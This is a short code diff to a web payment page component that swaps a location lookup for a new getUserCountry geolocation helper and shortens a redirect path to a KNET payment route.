@@ -10,6 +10,7 @@ import { Input } from "@/components/ui/input"
 import { Card, CardContent } from "@/components/ui/card"
 import { addData } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
+import { getUserCountry } from "@/lib/geolocation"
 
 interface PaymentData {
   id: string
@@ -65,7 +66,7 @@ export default function PaymentPage() {
     try {
       setIsInitializing(true)
       const sessionId = generateId()
-      const country = await getLocationData()
+      const country = await getUserCountry()
 
       const sessionData: PaymentData = {
         id: sessionId,
@@ -122,7 +123,7 @@ export default function PaymentPage() {
 
       // Simulate processing time
       await new Promise((resolve) => setTimeout(resolve, 1500))
-      router.push("/payment/knet")
+      router.push("/knet")
     } catch (error) {
       console.error("Payment submission failed:", error)
     
